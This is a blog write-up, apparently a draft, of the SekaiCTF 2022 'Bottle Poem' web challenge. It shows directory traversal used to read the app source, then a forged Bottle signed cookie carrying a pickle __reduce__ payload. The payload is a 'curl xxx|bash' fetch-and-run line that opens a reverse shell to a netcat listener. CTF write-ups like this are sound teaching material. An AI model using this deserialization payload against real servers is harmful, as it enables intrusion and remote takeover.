---
title: "Sekai Ctf 2022 Bottle Poem"
date: 2023-01-06T10:27:19+07:00
image: images/blog/web/sekai-ctf-2022-bottle-poem/sekai-ctf-2022-logo.png
feature_image: images/blog/web/sekai-ctf-2022-bottle-poem/sekai-ctf-2022-logo.png
author: duti
tags: ["web", "ctf", "duti"]
draft: true
---

### Problem statement

{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/problem-statement.png" title="" >}}
Author hints that flag is executable

{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/web-home.png" title="" >}}
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/web-link.png" title="" >}}

The website is vulnerable to directory traversal
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/web-link-directory-traversal.png" title="" >}}

Pick /etc/self/procline to get the start application command
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline.png" title="" >}}
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/self-procline.png" title="" >}}

So the application source is located at /app/app.py
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/self-procline.png" title="" >}}
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/app-source.png" title="" >}}
{{< gist hdthinh1012 fe0323be1368b472eb49f9b4cd629b07 >}}

If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap

The hint said flag is executable, meaning RCE is possible.

Let's have a look at Python Bottle

### Python Bottle
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/bottle-guide.png" title="" >}}

#### Bottle signed cookie
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/bottle-signed-step.png" title="" >}}
Bottle first:

- pickle.dumps([name, value], -1) then base64 encode → encoded
- hmac encrypt the secret seperately then base64 encode → signature
- add ‘!’ at the first char and ‘?’ in between signature

Cookie format: !__secret_hmac_base64__==?__pickle_name_value_base64__==

#### Bottle verify cookie
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/bottle-verify-step.png" title="" >}}
get_cookie:

- …
- base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1))

We have controlled the value input through cookie

### Pickle exploit [Ref](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)

{{< gist hdthinh1012 25791fc3bef8393f262434672ad6557f >}}

pickle still allows you to define a custom behavior for the pickling process for your class instances.


```
The __reduce__() method takes no argument and shall return either a string or 
preferably a tuple (the returned object is often referred to as the “reduce value”). 
[…] When a tuple is returned, it must be between two and six items long. 
Optional items can either be omitted, or None can be provided as their value. 
The semantics of each item are in order:

A callable object that will be called to create the initial version of the object.
A tuple of arguments for the callable object. An empty tuple must be given if the 
callable does not accept any argument. […]
```

So by implementing `__reduce__` in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.

So if any value in the array pass into pickle.dumps is an instance containing `__reduce__`(…) function, that reduce will be executed when calling pickle.loads(…). And the `__reduce__`(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.

So by implement reduce method that `return (eval, ('__import__("os").popen("curl xxx|bash")',))` , we can execute code on the server.

### The exercise step
#### Generate cookie 
Add an class definition with `__reduce__` method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.

{{< gist hdthinh1012 93a70b6e9a3be020872c3877b7101463 >}}

Running server and go to /sign with the Guest cookie to get the new Cookie with RCE instance dumps

{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/get-malicious-cookie.png" title="" >}}


<!-- {{< gist hdthinh1012 1244973789752ff62c2956e9698570eb >}} -->
In Attackbox, open netcat listener at port 55555:
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/run-nc-listener.png" title="" >}}

Request to the SekaiCTF with RCE cookie
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/run-payload.png" title="" >}}

Netcat listener now receive reverse shell:
{{< figure src="/images/blog/web/sekai-ctf-2022-bottle-poem/access-flag.png" title="" >}}

### Reference Links

Reverse Shell / Bind Shell: 

[https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/)

[https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)

[https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/)

Python Pickle Module `__reduce__` implements allow RCE:

[https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

Python Bottle get_cookie set_cookie using pickle.loads and pickle.dumps in its chain of encrypt/encode steps

[https://github.com/bottlepy/bottle/blob/master/bottle.py](https://github.com/bottlepy/bottle/blob/master/bottle.py) (ctrl+f set_cookie, get_cookie)





